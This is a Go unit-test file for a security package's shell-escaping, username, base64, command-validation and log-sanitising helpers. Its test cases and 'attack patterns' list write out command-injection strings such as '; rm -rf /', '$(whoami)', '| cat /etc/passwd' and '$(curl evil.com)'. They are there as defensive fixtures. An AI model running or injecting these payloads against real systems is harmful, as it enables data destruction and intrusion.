package security

import (
	"strings"
	"testing"
)

func TestShellEscape(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		contains string // What the escaped output should contain
	}{
		{
			name:     "simple string",
			input:    "hello",
			contains: "hello",
		},
		{
			name:     "string with spaces",
			input:    "hello world",
			contains: "hello world",
		},
		{
			name:     "command injection semicolon",
			input:    "; rm -rf /",
			contains: "; rm -rf /",
		},
		{
			name:     "command substitution dollar",
			input:    "$(whoami)",
			contains: "$(whoami)",
		},
		{
			name:     "command substitution backtick",
			input:    "`whoami`",
			contains: "`whoami`",
		},
		{
			name:     "variable expansion",
			input:    "${IFS}malicious",
			contains: "${IFS}malicious",
		},
		{
			name:     "newline injection",
			input:    "test\nmalicious",
			contains: "test",
		},
		{
			name:     "pipe injection",
			input:    "test | malicious",
			contains: "test | malicious",
		},
		{
			name:     "background execution",
			input:    "test & malicious",
			contains: "test & malicious",
		},
		{
			name:     "redirect injection",
			input:    "test > /etc/passwd",
			contains: "test > /etc/passwd",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			escaped := ShellEscape(tt.input)

			// Ensure the escaped string is quoted
			if !strings.HasPrefix(escaped, "\"") || !strings.HasSuffix(escaped, "\"") {
				t.Errorf("ShellEscape() = %v, expected quoted string", escaped)
			}

			// Ensure dangerous characters are escaped
			if strings.Contains(tt.input, "\n") && !strings.Contains(escaped, "\\n") {
				t.Errorf("ShellEscape() did not escape newline properly: %v", escaped)
			}
		})
	}
}

func TestValidateUsername(t *testing.T) {
	tests := []struct {
		name     string
		username string
		wantErr  bool
	}{
		{
			name:     "valid username",
			username: "ubuntu",
			wantErr:  false,
		},
		{
			name:     "valid with digits",
			username: "user123",
			wantErr:  false,
		},
		{
			name:     "valid with hyphen",
			username: "my-user",
			wantErr:  false,
		},
		{
			name:     "valid with underscore",
			username: "my_user",
			wantErr:  false,
		},
		{
			name:     "empty username",
			username: "",
			wantErr:  true,
		},
		{
			name:     "starts with digit",
			username: "1user",
			wantErr:  true,
		},
		{
			name:     "starts with uppercase",
			username: "User",
			wantErr:  true,
		},
		{
			name:     "contains uppercase",
			username: "myUser",
			wantErr:  true,
		},
		{
			name:     "contains special chars",
			username: "user@host",
			wantErr:  true,
		},
		{
			name:     "command injection attempt",
			username: "admin$(whoami)",
			wantErr:  true,
		},
		{
			name:     "command injection semicolon",
			username: "user;rm -rf /",
			wantErr:  true,
		},
		{
			name:     "too long",
			username: "thisusernameiswaytoolongandexceedsthirtytwocharacters",
			wantErr:  true,
		},
		{
			name:     "exactly 32 chars starting with letter",
			username: "a123456789012345678901234567890",
			wantErr:  false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateUsername(tt.username)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateUsername() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestValidateBase64(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
	}{
		{
			name:    "valid base64",
			input:   "SGVsbG8gV29ybGQ=",
			wantErr: false,
		},
		{
			name:    "valid base64 without padding",
			input:   "SGVsbG8gV29ybGQ",
			wantErr: false,
		},
		{
			name:    "empty string",
			input:   "",
			wantErr: true,
		},
		{
			name:    "contains newline",
			input:   "SGVsbG8\nV29ybGQ=",
			wantErr: true,
		},
		{
			name:    "contains space",
			input:   "SGVsbG8 V29ybGQ=",
			wantErr: true,
		},
		{
			name:    "contains special chars",
			input:   "Hello$World",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateBase64(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateBase64() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

func TestSanitizeForLog(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "no sensitive data",
			input:    "Hello World",
			expected: "Hello World",
		},
		{
			name:     "contains AWS access key",
			input:    "Error: AKIAIOSFODNN7EXAMPLE",
			expected: "Error: AKIA****************",
		},
		{
			name:     "contains secret key",
			input:    "wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
			expected: "****************************************",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := SanitizeForLog(tt.input)
			if result != tt.expected {
				t.Errorf("SanitizeForLog() = %v, want %v", result, tt.expected)
			}
		})
	}
}

func TestValidateCommand(t *testing.T) {
	tests := []struct {
		name    string
		cmd     string
		wantErr bool
	}{
		{
			name:    "safe command",
			cmd:     "hostname",
			wantErr: false,
		},
		{
			name:    "contains semicolon",
			cmd:     "ls; rm -rf /",
			wantErr: true,
		},
		{
			name:    "contains pipe",
			cmd:     "ls | grep test",
			wantErr: true,
		},
		{
			name:    "contains ampersand",
			cmd:     "sleep 10 &",
			wantErr: true,
		},
		{
			name:    "contains command substitution",
			cmd:     "echo $(whoami)",
			wantErr: true,
		},
		{
			name:    "contains backtick",
			cmd:     "echo `whoami`",
			wantErr: true,
		},
		{
			name:    "contains variable expansion",
			cmd:     "echo ${PATH}",
			wantErr: true,
		},
		{
			name:    "contains newline",
			cmd:     "echo\nrm -rf /",
			wantErr: true,
		},
		{
			name:    "contains redirect",
			cmd:     "cat > /etc/passwd",
			wantErr: true,
		},
		{
			name:    "contains input redirect",
			cmd:     "cat < /etc/passwd",
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := ValidateCommand(tt.cmd)
			if (err != nil) != tt.wantErr {
				t.Errorf("ValidateCommand() error = %v, wantErr %v", err, tt.wantErr)
			}
		})
	}
}

// Fuzzing-style test with many attack patterns
func TestShellEscapeAttackPatterns(t *testing.T) {
	attackPatterns := []string{
		"; rm -rf /",
		"$(whoami)",
		"`whoami`",
		"../../etc/passwd",
		"${IFS}malicious",
		"\nmalicious",
		"| cat /etc/passwd",
		"& malicious &",
		"> /dev/null",
		"< /etc/passwd",
		"|| malicious",
		"&& malicious",
		"test\nrm -rf /",
		"test;malicious",
		"$(curl evil.com)",
		"`curl evil.com`",
		"test${IFS}command",
		"a'b\"c",
		"test\x00null",
	}

	for _, pattern := range attackPatterns {
		t.Run(pattern, func(t *testing.T) {
			escaped := ShellEscape(pattern)

			// The escaped string should be quoted
			if !strings.HasPrefix(escaped, "\"") {
				t.Errorf("ShellEscape() did not quote attack pattern: %s -> %s", pattern, escaped)
			}

			// The escaped string should not execute the malicious pattern
			// This is a smoke test - actual shell execution testing would be in integration tests
			if !strings.Contains(escaped, "\\") && (strings.Contains(pattern, "\n") || strings.Contains(pattern, "$")) {
				t.Logf("Warning: Attack pattern may not be fully escaped: %s -> %s", pattern, escaped)
			}
		})
	}
}
